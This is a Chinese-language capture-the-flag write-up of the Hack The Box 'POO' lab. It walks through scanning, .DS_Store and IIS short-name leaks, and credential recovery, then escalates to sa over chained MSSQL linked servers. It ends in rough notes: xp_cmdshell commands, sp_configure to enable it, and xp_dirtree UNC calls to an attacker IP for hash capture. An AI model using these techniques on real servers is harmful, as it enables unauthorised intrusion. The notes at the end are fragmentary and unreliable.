
# 探测

```
┌──(root💀kali)-[~/htb/endgame/POO]
└─# nmap -sV -Pn -A -O 10.13.38.11                                                                                                                                                                                               1 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-20 22:12 EDT
Nmap scan report for 10.13.38.11 (10.13.38.11)
Host is up (0.25s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2027.00; RTM+
| ms-sql-ntlm-info: 
|   Target_Name: POO
|   NetBIOS_Domain_Name: POO
|   NetBIOS_Computer_Name: COMPATIBILITY
|   DNS_Domain_Name: intranet.poo
|   DNS_Computer_Name: COMPATIBILITY.intranet.poo
|   DNS_Tree_Name: intranet.poo
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-05-17T11:13:53
|_Not valid after:  2052-05-17T11:13:53
|_ssl-date: 2022-05-21T02:13:18+00:00; +4s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
| ms-sql-info: 
|   10.13.38.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2027.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   249.96 ms 10.10.14.1 (10.10.14.1)
2   249.86 ms 10.13.38.11 (10.13.38.11)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.47 seconds
```

只有两个端口

全盘扫描也只有两个

# 80

```
┌──(root㉿ss)-[~/htb/endgame/POO]
└─# python3 /root/dirsearch/dirsearch.py -e* -u http://10.13.38.11  

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.13.38.11/_22-05-20_22-20-31.txt

Error Log: /root/dirsearch/logs/errors-22-05-20_22-20-31.log

Target: http://10.13.38.11/

[22:20:32] Starting:                            
[22:20:33] 301 -  145B  - /js  ->  http://10.13.38.11/js/                  
[22:20:34] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[22:20:35] 200 -   10KB - /.ds_store                                       
[22:20:35] 200 -   10KB - /.DS_Store
[22:20:40] 301 -  151B  - /.trashes  ->  http://10.13.38.11/.trashes/      
[22:20:40] 301 -  151B  - /.Trashes  ->  http://10.13.38.11/.Trashes/
[22:20:44] 301 -  151B  - /META-INF  ->  http://10.13.38.11/META-INF/       
[22:20:44] 403 -    1KB - /META-INF/
[22:20:44] 301 -  155B  - /New%20Folder  ->  http://10.13.38.11/New%20Folder/
[22:20:44] 301 -  161B  - /New%20folder%20(2)  ->  http://10.13.38.11/New%20folder%20(2)/  
[22:21:32] 301 -  146B  - /dev  ->  http://10.13.38.11/dev/                 
[22:21:33] 403 -    1KB - /dev/                                             
[22:21:42] 301 -  149B  - /images  ->  http://10.13.38.11/images/           
[22:21:42] 403 -    1KB - /images/                                          
[22:21:44] 403 -    1KB - /js/                                              
[22:22:02] 301 -  150B  - /plugins  ->  http://10.13.38.11/plugins/         
[22:22:03] 403 -    1KB - /plugins/                                         
[22:22:17] 301 -  152B  - /templates  ->  http://10.13.38.11/templates/     
[22:22:17] 403 -    1KB - /templates/                                       
[22:22:18] 403 -    1KB - /themes/                                          
[22:22:18] 301 -  149B  - /themes  ->  http://10.13.38.11/themes/           
[22:22:20] 301 -  150B  - /uploads  ->  http://10.13.38.11/uploads/         
[22:22:20] 403 -    1KB - /uploads/

```

带指定扩展名爆破
```
┌──(root㉿ss)-[~/htb/endgame/POO]
└─# gobuster dir -t 100  --no-error --url http://10.13.38.11 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -x asp,aspx,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.13.38.11
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              asp,aspx,txt
[+] Timeout:                 10s
===============================================================
2022/05/20 23:02:55 Starting gobuster in directory enumeration mode
===============================================================
/templates            (Status: 301) [Size: 152] [--> http://10.13.38.11/templates/]
/images               (Status: 301) [Size: 149] [--> http://10.13.38.11/images/]   
/uploads              (Status: 301) [Size: 150] [--> http://10.13.38.11/uploads/]  
/Images               (Status: 301) [Size: 149] [--> http://10.13.38.11/Images/]   
/themes               (Status: 301) [Size: 149] [--> http://10.13.38.11/themes/]   
/admin                (Status: 401) [Size: 1293]                                   
/plugins              (Status: 301) [Size: 150] [--> http://10.13.38.11/plugins/]  
/dev                  (Status: 301) [Size: 146] [--> http://10.13.38.11/dev/]      
/js                   (Status: 301) [Size: 145] [--> http://10.13.38.11/js/]       
/Themes               (Status: 301) [Size: 149] [--> http://10.13.38.11/Themes/]   
/widgets              (Status: 301) [Size: 150] [--> http://10.13.38.11/widgets/]  
/Templates            (Status: 301) [Size: 152] [--> http://10.13.38.11/Templates/]
/IMAGES               (Status: 301) [Size: 149] [--> http://10.13.38.11/IMAGES/]   
/Admin                (Status: 401) [Size: 1293]                                   
/JS                   (Status: 301) [Size: 145] [--> http://10.13.38.11/JS/]       
/Plugins              (Status: 301) [Size: 150] [--> http://10.13.38.11/Plugins/]  
/Uploads              (Status: 301) [Size: 150] [--> http://10.13.38.11/Uploads/]  
/Widgets              (Status: 301) [Size: 150] [--> http://10.13.38.11/Widgets/]  
/Dev                  (Status: 301) [Size: 146] [--> http://10.13.38.11/Dev/]      
/DEV                  (Status: 301) [Size: 146] [--> http://10.13.38.11/DEV/]      
                                                                                   
===============================================================
2022/05/20 23:14:48 Finished
===============================================================

```



## ds_store文件

根据[这篇文章](https://miloserdov.org/?p=3867)里关于ds_store文件的介绍和利用方法

使用[这个exp](https://github.com/gehaxelt/Python-dsstore)可以知道文件夹里有哪些文件

```
┌──(root💀kali)-[~/htb/endgame/POO/Python-dsstore]
└─# python3 ./main.py /root/htb/endgame/POO/ds_store                                                                                                                                                 1 ⨯
Count:  38
admin
dev
iisstart.htm
Images
JS
META-INF
New folder
New folder (2)
Plugins
Templates
Themes
Uploads
web.config
Widgets
```


使用[这个exp](https://github.com/lijiejie/ds_store_exp)可以根据DS_Store下载对应文件夹里的文件
```
┌──(root💀kali)-[~/htb/endgame/POO/ds_store_exp]
└─# python2 ./ds_store_exp.py http://10.13.38.11/.DS_Store
[200] http://10.13.38.11/.DS_Store
[401] http://10.13.38.11/admin
[401] http://10.13.38.11/admin/.DS_Store
[200] http://10.13.38.11/dev/.DS_Store
[200] http://10.13.38.11/Widgets/.DS_Store
[200] http://10.13.38.11/JS/.DS_Store
[403] http://10.13.38.11/Templates
[403] http://10.13.38.11/JS
[403] http://10.13.38.11/Widgets
[200] http://10.13.38.11/Themes/.DS_Store
[403] http://10.13.38.11/Themes
[403] http://10.13.38.11/Uploads
[200] http://10.13.38.11/iisstart.htm
[403] http://10.13.38.11/META-INF
[200] http://10.13.38.11/Images/.DS_Store
[403] http://10.13.38.11/Images
[403] http://10.13.38.11/Plugins
[200] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/.DS_Store
[200] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/.DS_Store
[200] http://10.13.38.11/Widgets/Framework/.DS_Store
[403] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc
[403] http://10.13.38.11/Widgets/CalendarEvents
[403] http://10.13.38.11/Widgets/Menu
[403] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1
[403] http://10.13.38.11/Widgets/Notifications
[403] http://10.13.38.11/Themes/default
[403] http://10.13.38.11/Widgets/Framework
[200] http://10.13.38.11/Images/iisstart.png
[403] http://10.13.38.11/JS/custom
[403] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core
[403] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src
[403] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include
[403] http://10.13.38.11/Images/icons
[403] http://10.13.38.11/dev
[403] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
[200] http://10.13.38.11/Widgets/Framework/Layouts/.DS_Store
[403] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db
[403] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core
[403] http://10.13.38.11/Widgets/Framework/Layouts/default
[403] http://10.13.38.11/Widgets/Framework/Layouts
[403] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src
[403] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include
[403] http://10.13.38.11/Widgets/Framework/Layouts/custom

```

两个哈希可以md5解密
```
dca66d38fd916317687e1390a420c3fc  =>  eks
304c0c90fbc6520610abbf378e2339d1  =>  mrb3n
```

就是房间作者的名字
```
Professional Offensive Operations
By eks and mrb3n
```


## windows 短名称

> windows短名称将每个文件名限制为八个字符、一个点，然后是三个字符的扩展名

参考[这篇论文](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

使用github上[这个exp](https://github.com/lijiejie/IIS_shortname_Scanner)


```
┌──(root💀kali)-[~/htb/endgame/POO/IIS_shortname_Scanner]
└─# ./iis_shortname_Scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/
Server is vulnerable, please wait, scanning...
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.*      [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.*     [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.*    [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.*   [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.*  [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.* [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t*        [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx*       [scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*      [scan in progress]
[+] File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* [Done]
----------------------------------------------------------------
File: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*
----------------------------------------------------------------
0 Directories, 1 Files found in total
Note that * is a wildcard, matches any character zero or more times.

```


根据上面结果，靶机有可能存在一个```poo_co~1.txt```格式的文件

我们假设文件的结构是poo_XXXX.txt

使用fuzz fuziing文件名

注意这里fuziing的格式是poo_FUZZ.txt ，不要写成poo_coFUZZ.txt

制作一个co开头的字典
```
grep "^co" /usr/share/wordlists/rockyou.txt > co_fuzz.txt
```

fuzzing
```
┌──(root💀kali)-[~/htb/endgame/POO]
└─# ffuf -w co_fuzz.txt -u http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/poo_FUZZ.txt                                                     130 ⨯

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/poo_FUZZ.txt
 :: Wordlist         : FUZZ: co_fuzz.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

connection              [Status: 200, Size: 142, Words: 3, Lines: 7, Duration: 249ms]


```

拿到第一个flag，以及mssql登录信息
```
┌──(root💀kali)-[~/htb/endgame/POO]
└─# wget http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/poo_connection.txt
--2022-05-21 04:34:34--  http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/poo_connection.txt
正在连接 10.13.38.11:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：142 [text/plain]
正在保存至: “poo_connection.txt”

poo_connection.txt                      100%[============================================================================>]     142  --.-KB/s  用时 0s      


┌──(root💀kali)-[~/htb/endgame/POO]
└─# cat poo_connection.txt                                                                                                                               1 ⨯
SERVER=10.13.38.11
USERID=external_user
DBNAME=POO_PUBLIC
USERPWD=#p00Public3xt3rnalUs3r#

Flag : POO{fcfb0767f5bd3cbc22f40ff5011ad555}

```


## mssql

登录
```
sqsh -S 10.13.38.11 -U external_user -P '#p00Public3xt3rnalUs3r#' 
```


尝试执行系统命令,返回没有权限
```
┌──(root💀kali)-[~]
└─# sqsh -S 10.13.38.11 -U external_user -P '#p00Public3xt3rnalUs3r#'                                                                                                                                                          255 ⨯
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> EXEC MASTER..XP_CMDSHELL 'whoami'
2> go
Msg 229, Level 14, State 5
Server 'COMPATIBILITY\POO_PUBLIC', Procedure 'MASTER..XP_CMDSHELL', Line 1
The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.

```


### mssql link?

这部分的理论参考[这篇文章](https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/)


1. 如果启用了链接（dataaccess 设置为 1），则数据库服务器上的每个用户都可以使用该链接，而不管用户的权限如何（public、sysadmin、无所谓） 

2. 如果链接配置为使用 SQL 帐户，则每个连接都使用该帐户的权限（链接目标上的权限）进行。换句话说，服务器 A 上的公共用户可以潜在地以系统管理员的身份在服务器 B 上执行 SQL 查询。


查找活跃的link
```
1> select * from master..sysservers;
2> go
+-------+-----------+--------------------------+------------+--------------+--------------------------+----------+----------------+-------------------------+-----------+-----------+---------+--------------+----------------+--------------+--------------------------------+----------+-----+-----+-----+------+------+--------+------------+---------------------+--------+--------------------+----------------------+-----------+-----------+
| srvid | srvstatus | srvname                  | srvproduct | providername | datasource               | location | providerstring | schemadate              | topologyx | topologyy | catalog | srvcollation | connecttimeout | querytimeout | srvnetname                     | isremote | rpc | pub | sub | dist | dpub | rpcout | dataaccess | collationcompatible | system | useremotecollation | lazyschemavalidation | collation | nonsqlsub |
+-------+-----------+--------------------------+------------+--------------+--------------------------+----------+----------------+-------------------------+-----------+-----------+---------+--------------+----------------+--------------+--------------------------------+----------+-----+-----+-----+------+------+--------+------------+---------------------+--------+--------------------+----------------------+-----------+-----------+
|     0 |      1089 | COMPATIBILITY\POO_PUBLIC | SQL Server | SQLOLEDB     | COMPATIBILITY\POO_PUBLIC | NULL     | NULL           | 2018-03-17 13:21:26.370 |         0 |         0 | NULL    | NULL         |              0 |            0 | COMPATIBILITY\POO_PUBLIC       | 1        | 1   | 0   | 0   | 0    | 0    | 1      | 0          | 0                   | 0      | 1                  | 0                    | NULL      | 0         |
|     1 |      1249 | COMPATIBILITY\POO_CONFIG | SQL Server | SQLOLEDB     | COMPATIBILITY\POO_CONFIG | NULL     | NULL           | 2018-03-17 13:51:08.867 |         0 |         0 | NULL    | NULL         |              0 |            0 | COMPATIBILITY\POO_CONFIG       | 0        | 1   | 0   | 0   | 0    | 0    | 1      | 1          | 0                   | 0      | 1                  | 0                    | NULL      | 0         |
+-------+-----------+--------------------------+------------+--------------+--------------------------+----------+----------------+-------------------------+-----------+-----------+---------+--------------+----------------+--------------+--------------------------------+----------+-----+-----+-----+------+------+--------+------------+---------------------+--------+--------------------+----------------------+-----------+-----------+
(2 rows affected)
```

有两个link：COMPATIBILITY\POO_PUBLIC 和 COMPATIBILITY\POO_CONFIG

测试哪个link可以被利用

COMPATIBILITY\POO_PUBLIC,报错
```
1> select version from openquery("COMPATIBILITY\POO_PUBLIC", 'select @@version as version')
2> go
Msg 7411, Level 16, State 1
Server 'COMPATIBILITY\POO_PUBLIC', Line 1
Server 'COMPATIBILITY\POO_PUBLIC' is not configured for DATA ACCESS.
```

COMPATIBILITY\POO_CONFIG，有正确返回
```
1> select version from openquery("COMPATIBILITY\POO_CONFIG", 'select @@version as version')
2> go

        version                                                                                                                                                                                               
                                                                                                                                                                                                              
                                                                                                            

        ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------

        Microsoft SQL Server 2017 (RTM-GDR) (KB4505224) - 14.0.2027.2 (X64) 
        Jun 15 2019 00:26:19 
        Copyright (C) 2017 Microsoft Corporation
        Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
                                                                                                                                                                                                              
                                                                         

(1 row affected)
```


这里有一个更简单的语法，根据link执行sql语句，而且可以嵌套

COMPATIBILITY\POO_CONFIG

```
EXECUTE ('select suser_name();') at [COMPATIBILITY\POO_CONFIG];
```

可以执行
```
1> EXECUTE ('select suser_name();') at [COMPATIBILITY\POO_CONFIG];
2> go

                                                                                                                                                                                                              
                                                                                                                                                                                                              
                                                                                                            

        ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------

        internal_user                                                                                                                                                                                         
                                                                                                                                                                                                              
                                                                                                            

(1 row affected, return status = 0)

```

COMPATIBILITY\POO_PUBLIC
```
EXECUTE ('select suser_name();') at [COMPATIBILITY\POO_PUBLIC];
```

没有权限
```
1> EXECUTE ('select suser_name();') at [COMPATIBILITY\POO_PUBLIC];
2> go
Msg 18483, Level 14, State 1
Server 'COMPATIBILITY\POO_PUBLIC', Line 1
Could not connect to server 'COMPATIBILITY\POO_PUBLIC' because 'external_user' is not defined as a remote login at the server. Verify that you have specified the correct login name. .

```

嵌套调用链接
```
EXEC ('EXEC (''select suser_name();'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
```


返回SA
```
1> EXEC ('EXEC (''select suser_name();'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
2> go

                                                                                                                                                                                                              
                                                                                                                                                                                                              
                                                                                                            

        ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------

        sa                                                                                                                                                                                                    
                                                                                                                                                                                                              
                                                                                                            

(1 row affected, return status = 0)

```


EXEC ('EXEC (''enable_xp_cmdshell'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];



EXEC ('exec master..xp_cmdshell ''whoami'' at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];


EXEC MASTER..XP_CMDSHELL 'whoami'


exec master..xp_dirtree '\\10.10.15.178\asd'


 exec XP_DIRTREE '\\10.10.15.178\test

COMPATIBILITY\POO_PUBLIC

/root/impacket/examples/mssqlclient.py POO_PUBLIC\external_user:'#p00Public3xt3rnalUs3r#'@10.13.38.11 -windows-auth

cme mssql 10.10.15.178 -u external_user -p '#p00Public3xt3rnalUs3r#' --local-auth -x whoami


select 1 from openquery("COMPATIBILITY\POO_CONFIG",'select 1;exec master..xp_cmdshell ''whoami''')


select 1 from openquery("COMPATIBILITY\POO_CONFIG",'select 1;exec master..XP_DIRTREE ''\\10.10.15.178\test''')

select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell ''dir c:/''')


EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer



select version from openquery("COMPATIBILITY\POO_CONFIG", 'select @@version as version')